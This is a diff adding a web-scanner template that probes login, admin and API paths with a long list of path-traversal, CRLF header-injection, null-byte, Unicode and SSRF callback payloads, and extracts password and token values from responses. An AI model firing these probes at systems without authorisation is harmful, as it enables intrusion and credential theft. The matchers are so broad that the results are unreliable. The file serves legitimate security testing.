@@ -1,0 +1,195 @@
+id: injection-test
+info:
+  name: Injection Test Detection
+  author: pwn
+  severity: high
+  description: Detects potential injection vulnerabilities (e.g., path traversal, SSRF, HTTP header injection) by testing special characters, encoded characters, Unicode characters, and crafted payloads.
+  tags: injection, path-traversal, ssrf, header-injection, unicode
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.{{pattern}}"
+      - "{{BaseURL}}/login{{pattern}}"
+      - "{{BaseURL}}/admin{{pattern}}"
+      - "{{BaseURL}}/api{{pattern}}"
+      - "{{BaseURL}}:8080/.{{pattern}}"
+      - "{{BaseURL}}:8080/login{{pattern}}"
+      - "{{BaseURL}}:8080/admin{{pattern}}"
+      - "{{BaseURL}}:8080/api{{pattern}}"
+    payloads:
+      pattern:
+        - "."
+        - "%2E"
+        - "%252E"
+        - "%25252E"
+        - "/"
+        - "%2F"
+        - "%252F"
+        - "%25252F"
+        - "\\"
+        - "%5C"
+        - "%255C"
+        - "%25255C"
+        - "%"
+        - "%25"
+        - "%2525"
+        - "%252525"
+        - "?"
+        - "%3F"
+        - "%253F"
+        - "%25253F"
+        - ";"
+        - "%3B"
+        - "%253B"
+        - "%25253B"
+        - "#"
+        - "%23"
+        - "%2523"
+        - "%252523"
+        - "@"
+        - "%40"
+        - "%2540"
+        - "%252540"
+        - "&"
+        - "%26"
+        - "%2526"
+        - "%252526"
+        - "%A0"
+        - "%25A0"
+        - "%2525A0"
+        - "%20"
+        - "%2520"
+        - "%252520"
+        - "%00"
+        - "%2500"
+        - "%252500"
+        - "%FF"
+        - "%25FF"
+        - "%2525FF"
+        - "%0d"
+        - "%250d"
+        - "%25250d"
+        - "%0a"
+        - "%250a"
+        - "%25250a"
+        - "%E3%80%82"
+        - "%25E3%2580%2582"
+        - "%2525E3%252580%252582"
+        - "%E2%88%95"
+        - "%25E2%2588%2595"
+        - "%2525E2%252588%252595"
+        - "%E2%88%96"
+        - "%25E2%2588%2596"
+        - "%2525E2%252588%252596"
+        - "%D9%AA"
+        - "%25D9%25AA"
+        - "%2525D9%2525AA"
+        - "%EF%B9%96"
+        - "%25EF%25B9%2596"
+        - "%2525EF%2525B9%252596"
+        - "%EF%B9%94"
+        - "%25EF%25B9%2594"
+        - "%2525EF%2525B9%252594"
+        - "%EF%BC%83"
+        - "%25EF%25BC%2583"
+        - "%2525EF%2525BC%252583"
+        - "%EF%BC%A0"
+        - "%25EF%25BC%25A0"
+        - "%2525EF%2525BC%2525A0"
+        - "%EF%BC%86"
+        - "%25EF%25BC%2586"
+        - "%2525EF%2525BC%252586"
+        - "%E5%98%8D"
+        - "%25E5%2598%258D"
+        - "%2525E5%252598%25258D"
+        - "%E5%98%8A"
+        - "%25E5%2598%258A"
+        - "%2525E5%252598%25258A"
+        - "%20HTTP/7.7%0dHeader:"
+        - "%20HTTP/7.7%0aHeader:"
+        - "%20HTTP/7.7%0d%0aHeader:"
+        - "%2520HTTP/7.7%250dHeader:"
+        - "%2520HTTP/7.7%250aHeader:"
+        - "%2520HTTP/7.7%250d%250aHeader:"
+        - "%252520HTTP/7.7%25250dHeader:"
+        - "%252520HTTP/7.7%25250aHeader:"
+        - "%252520HTTP/7.7%25250d%25250aHeader:"
+        - "../?"
+        - "..\\?"
+        - "%2E%2E%2F%3F"
+        - "%2E%2E%5C%3F"
+        - "%252E%252E%252F%253F"
+        - "%252E%252E%255C%253F"
+        - "%25252E%25252E%25252F%25253F"
+        - "%25252E%25252E%25255C%25253F"
+        - "..;/?"
+        - "..;\\?"
+        - "%2E%2E%3B%2F%3F"
+        - "%2E%2E%3B%5C%3F"
+        - "%252E%252E%253B%252F%253F"
+        - "%252E%252E%253B%255C%253F"
+        - "%25252E%25252E%25253B%25252F%25253F"
+        - "%25252E%25252E%25253B%25255C%25253F"
+        - ".BURPCollaborator?"
+        - "%2EBURPCollaborator%3F"
+        - "%252EBURPCollaborator%253F"
+        - "%25252EBURPCollaborator%25253F"
+        - "@BURPCollaborator?"
+        - "%40BURPCollaborator%3F"
+        - "%2540BURPCollaborator%253F"
+        - "%252540BURPCollaborator%25253F"
+    attack: batteringram
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "password"
+          - "secret"
+          - "admin"
+          - "login"
+          - "error"
+          - "forbidden"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: regex
+        regex:
+          - "Header:.*"
+        part: header
+        condition: or
+      - type: word
+        words:
+          - "Server: Apache"
+          - "Server: nginx"
+          - "X-Powered-By: PHP"
+        part: header
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "admin"
+          - "login"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
+      - type: regex
+        name: response_data
+        part: body
+        regex:
+          - "(password|secret|key|token)=[^&\\s\"']+"
+        group: 1
